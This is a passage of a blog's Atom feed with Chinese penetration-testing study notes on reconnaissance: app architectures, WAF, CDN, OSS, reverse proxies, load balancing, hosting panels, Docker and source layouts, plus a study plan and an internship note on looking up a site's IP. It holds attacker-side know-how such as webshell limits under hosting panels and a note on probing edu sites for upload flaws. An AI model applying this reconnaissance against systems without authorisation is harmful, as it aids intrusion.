title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h3 id="3、使用flutter开发"><a href="#3、使用flutter开发" class="headerlink" title="3、使用flutter开发"></a>3、使用flutter开发</h3><p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><h3 id="4、常规Web开发"><a href="#4、常规Web开发" class="headerlink" title="4、常规Web开发"></a>4、常规Web开发</h3><p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><h4 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常Web安全测试</p><h4 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h4><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试j</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-05%20012642.png" alt="屏幕截图 2023-06-05 012642"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APP应用开发架构&quot;&gt;&lt;a href=&quot;#APP应用开发架构&quot; class=&quot;headerlink&quot; title=&quot;APP应用开发架构&quot;&gt;&lt;/a&gt;APP应用开发架构&lt;/h2&gt;&lt;h3 id=&quot;1、原生开发&quot;&gt;&lt;a href=&quot;#1、原生开发&quot; class=&quot;head</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>03Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-03.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-03.html</id>
    <published>2023-07-03T16:00:03.000Z</published>
    <updated>2023-07-06T13:39:42.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、WAF-：web-Application-firewall"><a href="#一、WAF-：web-Application-firewall" class="headerlink" title="一、WAF ：web Application firewall"></a>一、WAF ：web Application firewall</h2><p>原理：web应用防火墙，保护web</p><p>影响：安全测试手法被拦截</p><p>很难绕过</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195810154.png" alt="image-20230604195810154"></p><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195848213.png" alt="image-20230604195848213"></p><h2 id="二、CDN（Content-Delivery-Network-）"><a href="#二、CDN（Content-Delivery-Network-）" class="headerlink" title="二、CDN（Content Delivery Network ）"></a>二、CDN（Content Delivery Network ）</h2><p>开通后全国分布有节点，超级ping能查到ping通的IP地址</p><p>原理：内容分发服务，旨在提高访问速度 </p><p>影响：隐藏真实源IP，导致对目标测试错误，看到的是节点</p><p>演示：阿里云备案域名全局CDN加速服务</p><p>Windows2012 + BT宝塔面板 + CDN服务</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195914239.png" alt="image-20230604195914239"></p><h2 id="三、OSS（Object-Storage-Service）"><a href="#三、OSS（Object-Storage-Service）" class="headerlink" title="三、OSS（Object Storage Service）"></a>三、OSS（Object Storage Service）</h2><p>云存储服务，旨在提高访问速度</p><p>阿里云OSS:</p><p>开OSS</p><p>2、新建Bucket</p><p>3、配置Bucket属性</p><p>4、配置Access访问</p><p>原理：</p><p>为什么要使用第三方存储？</p><p>1）静态文件会占用大量带宽</p><p>2）加载速度</p><p>3）存储空间</p><p>影响：</p><p>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储</p><p>1、修复上传安全</p><p>2、文件解析不一样</p><p>3、但Accesskey隐患</p><h2 id="四、反向代理"><a href="#四、反向代理" class="headerlink" title="四、反向代理"></a>四、反向代理</h2><h3 id="1、正向代理，挂VPN一个意思"><a href="#1、正向代理，挂VPN一个意思" class="headerlink" title="1、正向代理，挂VPN一个意思"></a>1、正向代理，挂VPN一个意思</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195939721.png" alt="image-20230604195939721"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604200708819.png" alt="image-20230604200708819"></p><h3 id="2、反向代理"><a href="#2、反向代理" class="headerlink" title="2、反向代理"></a>2、反向代理</h3><h4 id="将真实的目标指向任意一个站点"><a href="#将真实的目标指向任意一个站点" class="headerlink" title="将真实的目标指向任意一个站点"></a>将真实的目标指向任意一个站点</h4><p>主机只能访问服务器1，服务器2将数据放到服务器1，主机间接访问服务器2 </p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230604200708819.png" alt="image-20230604200708819"></p><h4 id="如果设置了反向代理，比如反向代理设置为baidu-com-x2F"><a href="#如果设置了反向代理，比如反向代理设置为baidu-com-x2F" class="headerlink" title="如果设置了反向代理，比如反向代理设置为baidu.com/"></a>如果设置了反向代理，比如反向代理设置为baidu.com/</h4><h4 id="那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F"><a href="#那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F" class="headerlink" title="那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/"></a>那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/</h4><h2 id="五、负载均衡"><a href="#五、负载均衡" class="headerlink" title="五、负载均衡"></a>五、负载均衡</h2><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p><p>影响：有多个服务器加载服务，  测试过程中存在多个目标情况</p><p>演示：Nginx负载均衡配置</p><p>Windows2012 + BT宝塔面板 + Nginx</p><h4 id="定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"><a href="#定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）" class="headerlink" title="定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"></a>定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604204133704.png" alt="image-20230604204133704"></p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20204854.png" alt="屏幕截图 2023-06-04 204854"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、WAF-：web-Application-firewall&quot;&gt;&lt;a href=&quot;#一、WAF-：web-Application-firewall&quot; class=&quot;headerlink&quot; title=&quot;一、WAF ：web Application firewal</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>02Web其他-前后端&amp;软件&amp;Docker&amp;分配站</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-02.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-02.html</id>
    <published>2023-07-03T16:00:02.000Z</published>
    <updated>2023-07-10T03:39:56.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、-前后端分离"><a href="#一、-前后端分离" class="headerlink" title="一、 前后端分离"></a>一、 前后端分离</h2><h3 id="源码不同，前端源码和后端源码分离"><a href="#源码不同，前端源码和后端源码分离" class="headerlink" title="源码不同，前端源码和后端源码分离"></a>源码不同，前端源码和后端源码分离</h3><p>安全速度快，但大量数据传输不如传统网站</p><p>开发的框架，API传输数据</p><p>前端页面通过api接口传到后端，后台单独管理（类似于两个网站 ） </p><h3 id="1-前台只负责呈现（so基本没有漏洞）"><a href="#1-前台只负责呈现（so基本没有漏洞）" class="headerlink" title="1.前台只负责呈现（so基本没有漏洞）"></a>1.前台只负责呈现（so基本没有漏洞）</h3><p>js网站传输几乎都是API，基本不会有代码的逻辑性，页面光秃秃 </p><h3 id="2-后台更新影响前台"><a href="#2-后台更新影响前台" class="headerlink" title="2.后台更新影响前台"></a>2.后台更新影响前台</h3><p>后台域名大部分不在前端同域名中（so获取前端权限有可能不会影响后端） 能连接才能影响数据</p><p>扫描的时候找后端域名，如果找不到，查看前端框架有无历史漏洞，如果没有，只能尝试社工或者其他方法了</p><h2 id="二、宝塔-phpstudy（软件搭建的网站）"><a href="#二、宝塔-phpstudy（软件搭建的网站）" class="headerlink" title="二、宝塔+phpstudy（软件搭建的网站）"></a>二、宝塔+phpstudy（软件搭建的网站）</h2><p>(购买阿里云服务器，打开所有安全组，255端口要申请) </p><p>用不同软件搭建网站时，要关闭当前的网站</p><p>一个服务器只能支持一个软件搭建网站，端口会冲突</p><p>所需数据库，中间件不一样的话，也要关</p><p>###1.原理：打包类集成化环境，权限配置或受控制</p><h3 id="2-影响：攻击者权限对比区别（不同软件影响也不同）"><a href="#2-影响：攻击者权限对比区别（不同软件影响也不同）" class="headerlink" title="2.影响：攻击者权限对比区别（不同软件影响也不同）"></a>2.影响：攻击者权限对比区别（不同软件影响也不同）</h3><p>和常规搭建的网站最大区别就是权限区别 </p><p>宝塔：拿到权限后，webshell执行不了，文件管理锁定目录，只能看到当前网站目录，其他目录看不到，没有权限，宝塔自动加了限制    </p><p>phpstudy：whoami 获取用户权限 -administartor</p><p>自己IIS搭建有一半webshell能执行,目录也能查看一般</p><h2 id="三、docker-容器（都是假的，除非逃逸出去）"><a href="#三、docker-容器（都是假的，除非逃逸出去）" class="headerlink" title="三、docker 容器（都是假的，除非逃逸出去）"></a>三、docker 容器（都是假的，除非逃逸出去）</h2><p>原理：虚拟化技术独立磁盘空间，非真实物理环境</p><p>影响：攻击者虚拟空间磁盘 </p><h2 id="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h2><h3 id="1-托管（有版权）（面对的是安全公司）"><a href="#1-托管（有版权）（面对的是安全公司）" class="headerlink" title="1.托管（有版权）（面对的是安全公司）"></a>1.托管（有版权）（面对的是安全公司）</h3><h3 id="2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h3><p>原理：利用别人域名模版建立  </p><p>影响：实质安全测试非目标资产</p><h2 id="五、静态Web"><a href="#五、静态Web" class="headerlink" title="五、静态Web"></a>五、静态Web</h2><p>例子：大学学的html设计的网站（单一，想修改页面只能改源代码）</p><p>原理：数据没有传输性（js传输不算）</p><p>影响：无漏洞</p><h2 id="六、伪静态"><a href="#六、伪静态" class="headerlink" title="六、伪静态"></a>六、伪静态</h2><p>动态转为静态技术，伪装的静态</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20181607.png" alt="屏幕截图 2023-06-04 181607"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、-前后端分离&quot;&gt;&lt;a href=&quot;#一、-前后端分离&quot; class=&quot;headerlink&quot; title=&quot;一、 前后端分离&quot;&gt;&lt;/a&gt;一、 前后端分离&lt;/h2&gt;&lt;h3 id=&quot;源码不同，前端源码和后端源码分离&quot;&gt;&lt;a href=&quot;#源码不同，前端源码和后端源</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>01web常规-系统&amp;中间件&amp;数据库&amp;源码</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-01.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-01.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-06T13:39:29.755Z</updated>
    
    <content type="html"><![CDATA[<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png" alt="屏幕截图 2023-06-04 090622" style="zoom: 67%;"><h2 id="web四大件作用"><a href="#web四大件作用" class="headerlink" title="web四大件作用"></a>web四大件作用</h2><p>系统、中间件、数据库、源代码</p><h2 id="网站有哪些展示"><a href="#网站有哪些展示" class="headerlink" title="网站有哪些展示"></a>网站有哪些展示</h2><p>子域名模式 </p><p>端口模式</p><p>目录模式</p><p>公司发放的IP，扫描时扫描公司所有的IP</p><p>##文件访问解析</p><p>中间件、解析规则：中间解析规则决定上传到目标是什么类型</p><p>源文件的权限决定</p><p>锁图片文件，依旧可看，但没有执行了，有后门也不行</p><h2 id="源码配置文件"><a href="#源码配置文件" class="headerlink" title="源码配置文件"></a>源码配置文件</h2><p>1.数据库直接放在本地</p><p>2.数据库和网站分离，放在另外一个服务器上</p><p>数据库直接放到云端，拿到数据库账户密码也不行，云端只支持网站源码连接，可能只允许某些账号或目标访问</p><p>app.config数据库配置文件</p><h2 id="源码开源"><a href="#源码开源" class="headerlink" title="源码开源"></a>源码开源</h2><p>开源-源码可见</p><p>开源-源码不可见：各种加密，百度上有ASP加密     ，PHP加密什么的</p><p>语言特性决定：java运行以后就会改变                     </p><p>开源是为了白盒测试-代码审计</p><h2 id="源码结构目录"><a href="#源码结构目录" class="headerlink" title="源码结构目录"></a>源码结构目录</h2><p>admin后台管理相关</p><p>bin指引目录</p><p>database数据库相关</p><p>images图片相关</p><p>js前端文件</p><p>member会员</p><p>template模板</p><p>upfiles文件上传</p><p>webservice网站服务</p><p>##路由访问</p><p>常规：url+文件路径            url和文件目录对应不上，要根据路由配置决定</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><h3 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h3><p>原理：源码数据都在同服务器</p><p>影响：无，常规安全测试手法</p><h3 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h3><p>原理：源码数据库不在同服务器</p><p>存储：其他服务器上数据库&amp;云数据库产品</p><p>影响：数据被单独存放，能连接才可影响数据</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png&quot; alt=&quot;屏幕截图 202</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Destiny-plan</title>
    <link href="https://poison-biao.github.io/du-yu/destiny-plan.html"/>
    <id>https://poison-biao.github.io/du-yu/destiny-plan.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-22T07:07:14.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、备忘录"><a href="#一、备忘录" class="headerlink" title="一、备忘录"></a>一、备忘录</h1><p>1、美化终端<br>2、复盘<br>3、金砖<br>4、渊龙sec团队招新<br>5、Tryhackme<br>6、看迪宝！！！<br>7、世界战队排名！！<br>8、7月底的护网<br>9、edu可以直接打，证明有漏洞就行，不要碰其他（文件上传证明可以解析即可，不强制webhell，木马和phpinfo都不用证明，输出123就行了）<br>10、出题！！！！<br>11、pwndbg、GDB动态调试、ROP、checksec、libcsearcher、 binutils 工具集、readelf \ objdump<br>12、future群聊下载</p><h1 id="二、护网"><a href="#二、护网" class="headerlink" title="二、护网"></a>二、护网</h1><p>1、面试<br>2、国护！！！</p><h1 id="三、PWN"><a href="#三、PWN" class="headerlink" title="三、PWN"></a>三、PWN</h1><h1 id="四、战队"><a href="#四、战队" class="headerlink" title="四、战队"></a>四、战队</h1><p>WM<br>NUL_1<br>蓝水<br>小猪<br>山海关Arr3sty0u<br>渊龙sec</p><h1 id="五、电子取证"><a href="#五、电子取证" class="headerlink" title="五、电子取证"></a>五、电子取证</h1><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><p>1、ISCC线下决赛<br>2、金砖9月报名截止<br>3、蓝帽杯   <a href="https://datacon.qianxin.com/competition/competitions/53/introduction">https://datacon.qianxin.com/competition/competitions/53/introduction</a><br>4、强网杯<br>5、天网杯（安全漏洞挖掘大赛）<br>6、公安内网<br>7、AVSS 8月10日前  <a href="https://geekcon.darknavy.com/2023/china/">https://geekcon.darknavy.com/2023/china/</a>   <a href="https://mp.weixin.qq.com/s/6FUI20gSEkGoKTVADNn_2Q">https://mp.weixin.qq.com/s/6FUI20gSEkGoKTVADNn_2Q</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、备忘录&quot;&gt;&lt;a href=&quot;#一、备忘录&quot; class=&quot;headerlink&quot; title=&quot;一、备忘录&quot;&gt;&lt;/a&gt;一、备忘录&lt;/h1&gt;&lt;p&gt;1、美化终端&lt;br&gt;2、复盘&lt;br&gt;3、金砖&lt;br&gt;4、渊龙sec团队招新&lt;br&gt;5、Tryhackme&lt;br&gt;6、</summary>
      
    
    
    
    <category term="Destiny" scheme="https://poison-biao.github.io/categories/Destiny/"/>
    
    
    <category term="plan" scheme="https://poison-biao.github.io/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>实习-信息收集</title>
    <link href="https://poison-biao.github.io/du-yu/police-practice-01.html"/>
    <id>https://poison-biao.github.io/du-yu/police-practice-01.html</id>
    <published>2023-07-03T16:00:01.000Z</published>
    <updated>2023-07-10T03:30:50.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IP查询-amp-域名、网址分析"><a href="#IP查询-amp-域名、网址分析" class="headerlink" title="IP查询&amp;域名、网址分析"></a>IP查询&amp;域名、网址分析</h1><h2 id="总述：赶紧学习啊！！！"><a href="#总述：赶紧学习啊！！！" class="headerlink" title="总述：赶紧学习啊！！！"></a>总述：赶紧学习啊！！！</h2><p>实习第一天，让我解析一下领导留言板的域名：<a href="http://liuyan.people.com.cn/%EF%BC%8C%E5%88%9A%E5%BC%80%E5%A7%8B%E4%BB%A5%E4%B8%BA%E6%98%AF%E6%90%9C%E7%B4%A2IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E5%AE%9A%E4%BD%8D%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%8A%8A%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%BD%91%E5%9D%80%E6%94%BE%E5%88%B0%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7%E9%87%8C%E8%A7%A3%E6%9E%90">http://liuyan.people.com.cn/，刚开始以为是搜索IP地址进行定位，原来是把直接把网址放到站长工具里解析</a></p><h2 id="一、网站IP查询"><a href="#一、网站IP查询" class="headerlink" title="一、网站IP查询"></a>一、网站IP查询</h2><p>想要查询<a href="http://liuyan.people.com.cn/%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%BD%BF%E7%94%A8">http://liuyan.people.com.cn/的IP地址，使用</a> ping liuyan.people.com.cn </p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710095653955.png" alt="image-20230710095653955"></p><h2 id="二、网址分析"><a href="#二、网址分析" class="headerlink" title="二、网址分析"></a>二、网址分析</h2><p>使用站长工具：<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><p>直接搜索网址</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710101151951.png" alt="image-20230710101151951"></p><p>感觉是<strong>资产收集</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IP查询-amp-域名、网址分析&quot;&gt;&lt;a href=&quot;#IP查询-amp-域名、网址分析&quot; class=&quot;headerlink&quot; title=&quot;IP查询&amp;amp;域名、网址分析&quot;&gt;&lt;/a&gt;IP查询&amp;amp;域名、网址分析&lt;/h1&gt;&lt;h2 id=&quot;总述：赶紧学习啊！</summary>
      
    
    
    
    <category term="实习" scheme="https://poison-biao.github.io/categories/%E5%AE%9E%E4%B9%A0/"/>
    
    
    <category term="实习-信息收集" scheme="https://poison-biao.github.io/tags/%E5%AE%9E%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
